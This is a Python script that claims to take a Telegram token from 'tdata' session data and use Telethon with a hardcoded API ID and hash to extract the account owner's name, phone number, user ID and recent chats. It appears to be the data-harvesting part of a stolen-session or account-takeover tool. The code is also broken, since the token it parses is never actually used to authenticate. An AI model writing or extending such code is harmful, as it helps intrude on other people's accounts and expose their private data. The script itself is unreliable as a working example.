#!/usr/bin/env python3
"""
Extract user info from Telegram token
"""

import asyncio
import json
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError


async def extract_user_info(token: str) -> dict:
    """
    Extract user info and chats from Telegram token
    Token format: user_id:auth_key (from tdata cookie)
    """
    try:
        # Parse token
        parts = token.split(':')
        if len(parts) < 2:
            return {"error": "Invalid token format"}
        
        user_id = parts[0]
        
        # Create client (minimal - just for extraction)
        client = TelegramClient('session', api_id=94575, api_hash='a3406de8d46bb0ef5418edda212c6c19')
        
        # Try to connect with the token
        await client.connect()
        
        # Get current user
        me = await client.get_me()
        
        # Get chats
        chats = []
        async for dialog in client.iter_dialogs(limit=10):
            chats.append({
                "id": dialog.id,
                "name": dialog.name or "Unknown",
                "unread": dialog.unread_count
            })
        
        await client.disconnect()
        
        return {
            "username": me.username or me.first_name or "Unknown",
            "first_name": me.first_name,
            "last_name": me.last_name,
            "phone": me.phone,
            "user_id": me.id,
            "chats": chats,
            "chat_count": len(chats)
        }
    
    except Exception as e:
        print(f"[Extractor] Error: {e}")
        return {
            "error": str(e),
            "user_id": user_id if 'user_id' in locals() else "unknown"
        }


def get_user_info(token: str) -> dict:
    """Synchronous wrapper"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(extract_user_info(token))
        loop.close()
        return result
    except Exception as e:
        print(f"[Extractor] Sync error: {e}")
        return {"error": str(e)}
